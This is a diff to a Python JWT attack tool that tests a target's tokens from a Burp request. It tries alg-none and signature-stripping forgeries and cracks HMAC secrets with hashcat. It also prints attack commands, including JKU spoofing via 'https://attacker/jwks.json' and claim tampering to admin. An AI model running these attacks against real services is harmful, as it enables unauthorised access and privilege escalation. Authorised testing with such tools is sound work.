-    print("2. Embedded JWK (jwk header injection)")
+    print("   - Tool: jwt_tool.py <token> -X k -pk public.pem")
+    print()
+    print(f"{Fore.YELLOW}2. Embedded JWK (jwk header injection){Style.RESET_ALL}")
     print("   - Add \"jwk\":{...your public JWK...} to header, sign with your key")
-    print("   - Tool: jwt_tool.py <token> -X i\n")
-    print("3. JKU / X5U Spoofing (covered above)")
-    print("   - Tool: jwt_tool.py <token> -X s -ju https://attacker/jwks.json\n")
-    print("4. Token Replay")
-    print("   - Use captured token after logout; check blacklist / jti revocation\n")
-    print("5. Expired / Not-Before Bypass")
-    print("   - Modify exp/nbf; some servers skip claim validation\n")
-    print("6. Claim Tampering (after any bypass)")
-    print("   - role -> admin, is_admin -> true, user_id -> 1, sub -> administrator\n")
-    print("7. kid Injection (covered above)")
-    print("8. JWT Storage / XSS")
-    print("   - localStorage vs HttpOnly cookie\n")
-    print("9. Weak HMAC Secret (covered above)")
-    print("10. Cross-Service Confusion")
-    print("    - Same signing key across services/envs\n")
-    print("11. Long-Lived / No-Expiry Tokens")
-    print("    - Check exp existence and refresh rotation\n")
-    print("12. Header Parameter Pollution")
-    print("    - Duplicate alg / kid / jku\n")
-    print("Tools: jwt_tool, hashcat (-m 16500), john, Burp JWT Editor, jwt.io")
+    print("   - Tool: jwt_tool.py <token> -X i")
+    print()
+    print(f"{Fore.YELLOW}3. JKU / X5U Spoofing (covered above){Style.RESET_ALL}")
+    print("   - Tool: jwt_tool.py <token> -X s -ju https://attacker/jwks.json")
+    print()
+    print(f"{Fore.YELLOW}4. Token Replay{Style.RESET_ALL}")
+    print("   - Use captured token after logout; check blacklist / jti revocation")
+    print()
+    print(f"{Fore.YELLOW}5. Expired / Not-Before Bypass{Style.RESET_ALL}")
+    print("   - Modify exp/nbf; some servers skip claim validation")
+    print()
+    print(f"{Fore.YELLOW}6. Claim Tampering (after any bypass){Style.RESET_ALL}")
+    print("   - role -> admin, is_admin -> true, user_id -> 1, sub -> administrator")
+    print()
+    print(f"{Fore.YELLOW}7. kid Injection (covered above){Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}8. JWT Storage / XSS{Style.RESET_ALL}")
+    print("   - localStorage vs HttpOnly cookie")
+    print()
+    print(f"{Fore.YELLOW}9. Weak HMAC Secret (covered above){Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}10. Cross-Service Confusion{Style.RESET_ALL}")
+    print("    - Same signing key across services/envs")
+    print()
+    print(f"{Fore.YELLOW}11. Long-Lived / No-Expiry Tokens{Style.RESET_ALL}")
+    print("    - Check exp existence and refresh rotation")
+    print()
+    print(f"{Fore.YELLOW}12. Header Parameter Pollution{Style.RESET_ALL}")
+    print("    - Duplicate alg / kid / jku")
+    print()
+    print(c_info("Tools: jwt_tool, hashcat (-m 16500), john, Burp JWT Editor, jwt.io"))
 
 # ---------- Main ----------
 
 def main():
-    p = argparse.ArgumentParser(description="Automated JWT tester (Burp request)")
+    p = argparse.ArgumentParser(description="JWTCannon - Automated JWT tester (Hashcat Edition)")
     p.add_argument("request_file", help="Burp-saved request text file")
     p.add_argument("--scheme", default="https", choices=["http", "https"])
-    p.add_argument("--workers", type=int, default=os.cpu_count() or 4)
     p.add_argument("--skip-crack", action="store_true")
     p.add_argument("--ignore-expiry", action="store_true",
                    help="Skip the expiry prompt (continue regardless)")
+    p.add_argument("--hashcat", default=None,
+                   help="Path to hashcat binary (auto-detect if omitted)")               
+    p.add_argument("--proxy", default=None,
+                   help="Proxy URL for all requests, e.g. http://127.0.0.1:8080")
+    p.add_argument("--burp", action="store_true",
+                   help="Shortcut: route requests through Burp at 127.0.0.1:8080")
     args = p.parse_args()
+    
+        # ---- Proxy setup ----
+    global PROXY_URL
+    if args.burp:
+        PROXY_URL = "http://127.0.0.1:8080"
+    elif args.proxy:
+        PROXY_URL = args.proxy
 
-    print(SEPARATOR)
-    print("JWT AUTOMATED TESTER")
-    print(SEPARATOR)
+    if PROXY_URL:
+        print(c_proxy(f"All HTTP requests will be sent via {PROXY_URL}"))
+        print(c_proxy("Tip: disable 'Intercept' in Burp (Proxy tab) so requests pass through."))
+    else:
+        print(c_info("No proxy configured. Use --burp or --proxy to route via Burp."))
+
+    print(c_sep())
+    print(c_title("  J W T C A N N O N   -   H A S H C A T   E D I T I O N  "))
+    print(c_sep())
 
     try:
         req = load_burp_request(args.request_file)
     except Exception as e:
-        print(f"[!] Failed to parse request file: {e}")
+        print(c_fail(f"Failed to parse request file: {e}"))
         sys.exit(1)
-    print(f"[*] Loaded: {req['method']} {req['path']} Host: {req['host']}")
+    print(c_info(f"Loaded: {req['method']} {req['path']} Host: {req['host']}"))
 
     jwts = find_jwts(req["raw"])
     if not jwts:
-        print("[!] No JWT found. Exiting.")
+        print(c_fail("No JWT found. Exiting."))
         sys.exit(1)
-    print(f"[*] Found {len(jwts)} JWT(s)")
+    print(c_info(f"Found {len(jwts)} JWT(s)"))
 
     jwt_info = parse_jwt(jwts[0])
     if not jwt_info:
-        print("[!] Failed to parse JWT.")
+        print(c_fail("Failed to parse JWT."))
         sys.exit(1)
 
-    print(f"[*] Algorithm: {jwt_info['header'].get('alg')}")
-    print(f"[*] Header : {json.dumps(jwt_info['header'])}")
-    print(f"[*] Payload: {json.dumps(jwt_info['payload'])}")
+    print(c_info(f"Algorithm: {Fore.YELLOW}{jwt_info['header'].get('alg')}{Style.RESET_ALL}"))
+    print(c_info(f"Header : {json.dumps(jwt_info['header'])}"))
+    print(c_info(f"Payload: {json.dumps(jwt_info['payload'])}"))
 
-    # Expiry handling (no auto-refresh; just guidance)
+    # Expiry handling
     if not args.ignore_expiry:
         handle_token_expiry(jwt_info)
 
+    # Hashcat detection
+    hashcat_path = args.hashcat or find_hashcat()
+    if not args.skip_crack:
+        hashcat_path = check_hashcat_available()
+        if hashcat_path is None:
+            print(c_warn("Cracking will be skipped (no hashcat)."))
+            args.skip_crack = True
+        elif not check_hashcat_backend(hashcat_path):
+            print(c_warn("Cracking will be skipped (no OpenCL/CUDA backend)."))
+            args.skip_crack = True
+
     # Pre-prompt cracking config
     if not args.skip_crack:
-        charset, min_len, max_len = prompt_crack_config()
+        choice, min_len, max_len = prompt_crack_config()
     else:
-        charset, min_len, max_len = "", 0, 0
+        choice, min_len, max_len = "", 0, 0
 
+    # Baseline
     base_resp = baseline_response(req, jwt_info, args.scheme)
     if base_resp is None:
-        print("[!] No baseline. Exiting.")
+        print(c_fail("No baseline. Exiting."))
         sys.exit(1)
 
+    # Tests
     test_alg_none(req, jwt_info, base_resp, args.scheme)
     test_sig_stripping(req, jwt_info, base_resp, args.scheme)
     analyze_kid(jwt_info)
     analyze_jku_x5u(jwt_info)
 
-    # Cracking last
-    if not args.skip_crack:
-        found = crack_with_seclists(jwt_info)
-        if not found:
-            found = crack_bruteforce(jwt_info, charset, min_len, max_len, args.workers)
-        if found:
-            print(f"\n[+] WEAK SECRET CONFIRMED: {found!r}")
-        else:
-            print("\n[+] Secret not recovered. Likely strong.")
+    # Cracking (LAST)
+    if not args.skip_crack and hashcat_path:
+        found = None
 
+        # 5a: SecLists wordlist
+        wordlist = find_seclists()
+        if wordlist:
+            found = crack_with_hashcat_wordlist(jwt_info, hashcat_path, wordlist)
+        else:
+            print()
+            print(c_warn("SecLists wordlist NOT FOUND. Looked in:"))
+            for p in SECLISTS_PATHS:
+                print(f"    - {p}")
+            print(c_info("Install:  sudo apt install seclists"))
+            print(c_info("Skipping wordlist phase."))
+
+        # 5b: Mask brute-force
+        if not found:
+            found = crack_with_hashcat_mask(jwt_info, hashcat_path, choice, min_len, max_len)
+
+        if found:
+            print()
+            print(c_hit(f"WEAK SECRET CONFIRMED: {found!r}"))
+        else:
+            print()
+            print(c_ok("Secret not recovered. Likely strong."))
+            
+        # 5b: Mask brute-force
+        #if not found:
+         #   found = crack_with_hashcat_mask(jwt_info, hashcat_path, choice, min_len, max_len)
+
+    # Final guide
     print_remaining_attacks(jwt_info)
 
-    print("\n" + SEPARATOR)
-    print("TESTING COMPLETE")
-    print(SEPARATOR)
+    print()
+    print(c_sep())
+    print(c_title("TESTING COMPLETE"))
+    print(c_sep())
 
 if __name__ == "__main__":
     try:
+        
+        
+        
+        
+        
         main()
     except KeyboardInterrupt:
-        print("\n[!] Interrupted.")
+        print()
+        print(c_warn("Interrupted."))
         sys.exit(130)
